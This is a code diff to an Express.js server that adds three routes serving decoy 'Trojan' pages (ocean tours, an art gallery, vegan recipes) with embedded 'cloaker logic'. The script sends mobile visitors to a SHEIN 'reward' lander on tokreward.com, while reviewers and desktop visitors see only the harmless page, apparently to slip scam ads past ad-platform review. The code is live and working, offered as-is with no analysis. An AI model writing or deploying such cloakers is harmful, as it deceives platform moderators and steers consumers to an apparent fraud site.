@@ -14,6 +14,320 @@ const vhost = require('vhost');
 // Serve static files from the public directory
 app.use(express.static(path.join(__dirname, 'public')));
 
+// ALEXI 5.0
+
+// SHEIN BH FLUENT
+app.get('/90510/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=905`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>
+        // Cloaker logic
+        const urlParams = new URLSearchParams(window.location.search);
+        const utmXXX = urlParams.get("xxx");
+        const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        if (utmXXX === "__PLACEMENT__") {
+            } else if (isMobileDevice) {
+                window.location.href = "https://tokreward.com/shein.html?slug=905";
+            } else {
+            }
+    </script>
+    <title>${slug}</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            font-family: 'Arial', sans-serif;
+            background-color: #f0f8ff;
+            color: #333;
+        }
+        .wrapper {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        header {
+            background-color: #4a90e2;
+            color: white;
+            text-align: center;
+            padding: 1em;
+        }
+        .main-content {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            margin-top: 2em;
+        }
+        .card {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            padding: 1.5em;
+            margin-bottom: 1.5em;
+            width: calc(33% - 1em);
+        }
+        footer {
+            background-color: #333;
+            color: white;
+            text-align: center;
+            padding: 1em;
+            margin-top: 2em;
+        }
+        footer a {
+            color: #4a90e2;
+        }
+    </style>
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+            <h1>${slug}'s Ocean Adventures</h1>
+        </header>
+        <div class="main-content">
+            <div class="card">
+                <h2>Dive into Wonder</h2>
+                <p>Experience the thrill of underwater exploration with ${slug}. Our expert-led diving tours will take you to the most breathtaking coral reefs and marine ecosystems.</p>
+            </div>
+            <div class="card">
+                <h2>Eco-Friendly Excursions</h2>
+                <p>Join ${slug} in our mission to protect the oceans. All our adventures are designed with sustainability in mind, ensuring minimal impact on marine life.</p>
+            </div>
+            <div class="card">
+                <h2>Photography Workshops</h2>
+                <p>Capture the beauty of the underwater world with our specialized photography workshops. Learn from professional marine photographers and create lasting memories.</p>
+            </div>
+        </div>
+        <footer>
+            <p>&copy; 2024 ${slug}'s Ocean Adventures | <a href="https://tokreward.com/pp.html">Privacy Policy</a></p>
+        </footer>
+    </div>
+</body>
+</html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 905 Trojan (${slug})`);
+});
+
+
+// SHEIN BH FLUENT
+app.get('/94710/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=947`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>
+        // Cloaker logic
+        const urlParams = new URLSearchParams(window.location.search);
+        const utmXXX = urlParams.get("xxx");
+        const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        if (utmXXX === "__PLACEMENT__") {
+            } else if (isMobileDevice) {
+                window.location.href = "https://tokreward.com/shein.html?slug=947";
+            } else {
+            }
+    </script>
+    <title>${slug}</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', sans-serif;
+            background-color: #f5f5f5;
+            color: #333;
+        }
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        header {
+            background-color: #2c3e50;
+            color: white;
+            text-align: center;
+            padding: 2em 0;
+        }
+        .gallery {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-top: 2em;
+        }
+        .gallery-item {
+            background-color: white;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        .gallery-item img {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+        }
+        .gallery-item-content {
+            padding: 1em;
+        }
+        footer {
+            background-color: #34495e;
+            color: white;
+            text-align: center;
+            padding: 1em;
+            margin-top: 2em;
+        }
+        footer a {
+            color: #3498db;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>${slug}'s Artistic Showcase</h1>
+    </header>
+    <div class="container">
+        <div class="gallery">
+            <div class="gallery-item">
+                <img src="https://picsum.photos/seed/art1/400/300" alt="Abstract Art">
+                <div class="gallery-item-content">
+                    <h3>Abstract Visions</h3>
+                    <p>Explore the depths of imagination in ${slug}'s abstract collection.</p>
+                </div>
+            </div>
+            <div class="gallery-item">
+                <img src="https://picsum.photos/seed/art2/400/300" alt="Landscape Art">
+                <div class="gallery-item-content">
+                    <h3>Natural Wonders</h3>
+                    <p>${slug}'s landscapes capture the beauty of our world.</p>
+                </div>
+            </div>
+            <div class="gallery-item">
+                <img src="https://picsum.photos/seed/art3/400/300" alt="Portrait Art">
+                <div class="gallery-item-content">
+                    <h3>Faces of Humanity</h3>
+                    <p>Discover the stories behind ${slug}'s captivating portraits.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <footer>
+        <p>&copy; 2024 ${slug}'s Artistic Showcase | <a href="https://tokreward.com/pp.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served 947 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
+app.get('/94810/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=948`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>
+        // Cloaker logic
+        const urlParams = new URLSearchParams(window.location.search);
+        const utmXXX = urlParams.get("xxx");
+        const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        if (utmXXX === "__PLACEMENT__") {
+            } else if (isMobileDevice) {
+                window.location.href = "https://tokreward.com/shein.html?slug=948";
+            } else {
+            }
+    </script>
+    <title>${slug}</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            font-family: 'Montserrat', sans-serif;
+            background-color: #ecf0f1;
+            color: #2c3e50;
+        }
+        .page-wrapper {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background-color: #27ae60;
+            color: white;
+            text-align: center;
+            padding: 2em 0;
+        }
+        .content {
+            flex-grow: 1;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            align-items: center;
+            padding: 2em;
+        }
+        .recipe-card {
+            background-color: white;
+            border-radius: 15px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            margin: 1em;
+            padding: 1.5em;
+            width: 300px;
+        }
+        .recipe-card h2 {
+            color: #27ae60;
+        }
+        footer {
+            background-color: #2c3e50;
+            color: white;
+            text-align: center;
+            padding: 1em;
+        }
+        footer a {
+            color: #3498db;
+        }
+    </style>
+</head>
+<body>
+    <div class="page-wrapper">
+        <header>
+            <h1>${slug}'s Vegan Delights</h1>
+        </header>
+        <div class="content">
+            <div class="recipe-card">
+                <h2>Quinoa Buddha Bowl</h2>
+                <p>A nutritious and colorful bowl packed with quinoa, roasted vegetables, and a tangy tahini dressing. ${slug}'s favorite for a quick and healthy lunch!</p>
+            </div>
+            <div class="recipe-card">
+                <h2>Mushroom Walnut Bolognese</h2>
+                <p>This hearty pasta sauce is ${slug}'s twist on a classic. Rich, meaty (without the meat!), and absolutely delicious.</p>
+            </div>
+            <div class="recipe-card">
+                <h2>Coconut Curry Lentil Soup</h2>
+                <p>Warm up with ${slug}'s comforting soup. Creamy coconut milk, aromatic spices, and protein-packed lentils make this a perfect dinner option.</p>
+            </div>
+        </div>
+        <footer>
+            <p>&copy; 2024 ${slug}'s Vegan Delights | <a href="https://tokreward.com/pp.html">Privacy Policy</a></p>
+        </footer>
+    </div>
+</body>
+</html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 948 Trojan (${slug})`);
+});
+
+
 
 
 // FACEBOOK HERMES V1.0
